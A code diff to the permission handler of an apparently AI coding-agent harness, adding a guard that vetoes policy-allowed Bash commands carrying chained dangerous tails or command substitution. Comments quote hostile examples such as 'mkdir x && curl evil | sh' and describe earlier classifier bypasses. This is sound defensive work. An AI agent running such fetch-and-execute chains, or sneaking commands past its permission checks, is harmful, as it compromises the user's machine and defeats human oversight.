@@ -22,8 +22,13 @@ from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
 from claude_agent_sdk.types import ToolPermissionContext
 
 from .guardrails import SessionGuardrails
-from .policy import evaluate, load_policy
-from .tier1 import is_tier1_auto_approve
+from .policy import Policy, evaluate, load_policy
+from .tier1 import (
+    _split_compound_command,
+    is_safe_bash_command,
+    is_tier1_auto_approve,
+    is_tier3_dangerous,
+)
 from .transport import invoke_command
 from .types import (
     PilotConfig,
@@ -57,6 +62,117 @@ CanUseTool = Callable[
     [str, dict[str, Any], ToolPermissionContext],
     Awaitable[PermissionResult],
 ]
+
+
+# ── Chained-danger guard over policy Bash allow (claude-pilot#25) ────────────
+#
+# policy.evaluate() matches a single regex against the WHOLE command string
+# (policy.py first-match-wins) — it does NOT compound-split or danger-scan.
+# Tier1, by contrast, is safe precisely because it splits a compound and
+# requires EVERY sub-command to be on an allow-list (tier1.is_safe_bash_command
+# → _is_safe_sub_command). A policy allow rule like ``^mkdir`` matches the whole
+# string ``mkdir x && curl evil | sh`` and the dangerous tail rides along.
+# Re-applying only a *denylist* (is_tier3_dangerous) is insufficient: curl|sh,
+# ./payload, pip/npm/python install, chmod, dd, cp-of-secrets, node -e … are not
+# on that denylist. So this guard mirrors tier1's ALLOW-LIST model over the
+# chain: a policy-allowed Bash command is honored only when every compound
+# segment is independently (a) tier1-safe, or (b) itself a clean policy allow.
+#
+# Substitution: ``mkdir "$(curl evil)"`` — forbidden outright via the literal
+# markers below. DELIBERATELY stricter than tier1's quote-aware
+# contains_unquoted_metacharacter (which ignores substitution inside double
+# quotes, mirroring the Rust pre-classifier — mika#944/#946); the new dev-pilot
+# rules are write-capable, so a policy-allowed command never needs substitution.
+#
+# Heredoc / here-string: we do NOT parse bash heredoc grammar with regexes —
+# that is a lexer the line-based approximations keep losing to (a ``<<<`` here-
+# string desync once let a chained tail ride through). Structural rule instead:
+# ``<<<`` (here-string) is vetoed outright; ``<<`` (heredoc) is admitted only for
+# the single sanctioned ``cat > /tmp`` rule, and only when nothing executable is
+# chained after the heredoc terminator. Every other ``<<`` command is vetoed.
+
+# Command-substitution markers forbidden on the policy-allow path.
+_SUBSTITUTION_MARKERS = ("$(", "`", "$'")
+
+# A bare ``&`` used as a backgrounding separator (not ``&&``, not an fd-dup like
+# ``2>&1`` / ``>&2`` / ``&>``). Splitting on it is unsafe (would break fd-dups),
+# so we reject any command that contains one — a policy-allowed dev command
+# never backgrounds.
+_BARE_AMP_RE = re.compile(r"(?<![>&\d])&(?!&|>)")
+
+# The ONLY sanctioned heredoc shape, validated as one whole opener line. The
+# delimiter is HARD-CODED to ``EOF`` on purpose: four prior review passes each
+# found a desync from trying to *lex* bash's heredoc delimiter with a regex
+# (``<<<`` here-strings, trailing commands, leading chains, and ``<<EOF.``
+# non-word delimiter suffixes). Fixing the delimiter to a literal ``EOF`` means
+# the classifier's close-point cannot diverge from bash's — there is no
+# delimiter to mis-parse. The opener must be the entire first line (``^…$``):
+# ``cat`` redirecting to a single ``/tmp/<token>`` path (no spaces, no ``..``),
+# then ``<<`` / ``<<-`` and exactly ``EOF`` / ``'EOF'`` / ``"EOF"``. Anything
+# chained or substituted before ``<<`` breaks the full-line match → veto.
+_SANCTIONED_HEREDOC_OPENER_RE = re.compile(
+    r"""^cat\s+>\s+/tmp/(?!.*\.\.)[\w./-]+\s+<<-?\s*(?:'EOF'|"EOF"|EOF)\s*$"""
+)
+_HEREDOC_TERMINATOR = "EOF"
+
+
+def _is_sanctioned_pure_heredoc(command: str) -> bool:
+    """True only for ``cat > /tmp/<token> <<EOF`` … ``EOF`` with no trailing command.
+
+    The opener is matched as a whole line so nothing rides before ``<<``; the
+    body closes on a bare ``EOF`` line (delimiter is fixed, so the close-point
+    matches bash); nothing executable may follow the terminator. Conservative on
+    any ambiguity (unterminated, trailing non-blank) → False so the caller vetoes.
+    """
+    lines = command.split("\n")
+    if not _SANCTIONED_HEREDOC_OPENER_RE.match(lines[0]):
+        return False
+    j = 1
+    while j < len(lines) and lines[j].strip() != _HEREDOC_TERMINATOR:
+        j += 1
+    if j >= len(lines):
+        return False  # unterminated heredoc
+    return all(not lines[k].strip() for k in range(j + 1, len(lines)))
+
+
+def _bash_allow_is_chain_safe(
+    policy: Policy, tool_name: str, tool_input: dict[str, Any]
+) -> bool:
+    """Whether a policy ``allow`` decision is safe to honor.
+
+    ``True`` for every non-Bash tool. For Bash, ``True`` only when every
+    compound segment is independently tier1-safe or a clean (non-tier3) policy
+    allow — so a dangerous command chained onto an allowed prefix is vetoed.
+    """
+    if tool_name != "Bash":
+        return True
+    command = tool_input.get("command", "")
+    if not isinstance(command, str):
+        return False
+
+    if "<<<" in command:  # here-string: never parseable as inert, always veto
+        return False
+    if "<<" in command:
+        # The ONLY ``<<`` admitted is the sanctioned, fully-anchored /tmp
+        # cat-heredoc (delimiter fixed to EOF). Everything else routes to relay.
+        return _is_sanctioned_pure_heredoc(command)
+
+    if any(marker in command for marker in _SUBSTITUTION_MARKERS):
+        return False
+    if _BARE_AMP_RE.search(command):
+        return False
+
+    segments = _split_compound_command(command)
+    if not segments:
+        return False
+    for seg in segments:
+        if is_safe_bash_command(seg):
+            continue
+        pd = evaluate(policy, tool_name, {"command": seg})
+        if pd.decision == "allow" and not is_tier3_dangerous(seg):
+            continue
+        return False
+    return True
 
 
 def _fire_notify(tool_name: str, detail: str, reason: str) -> None:
@@ -115,6 +231,18 @@ def create_permission_handler(
             pd = evaluate(policy, tool_name, tool_input)
             detail = _summarize_input(tool_name, tool_input)
             if pd.decision == "allow":
+                # Chained-danger guard (claude-pilot#25): a policy allow rule
+                # matches a whole-command regex; veto it if a dangerous tail is
+                # chained onto the allowed prefix. Halt honestly (interrupt=True)
+                # like every other policy denial (cpp#20 joint 2).
+                if not _bash_allow_is_chain_safe(policy, tool_name, tool_input):
+                    veto_reason = (
+                        f"policy allow ({pd.rule_id}) vetoed — command chains a "
+                        "tier3-dangerous or command-substitution tail onto the "
+                        "allowed prefix"
+                    )
+                    log_policy_deny(tool_name, detail, pd.rule_id)
+                    return PermissionResultDeny(message=veto_reason, interrupt=True)
                 log_policy_allow(tool_name, detail, pd.rule_id)
                 return PermissionResultAllow(updated_input=tool_input)
             if pd.decision == "deny":
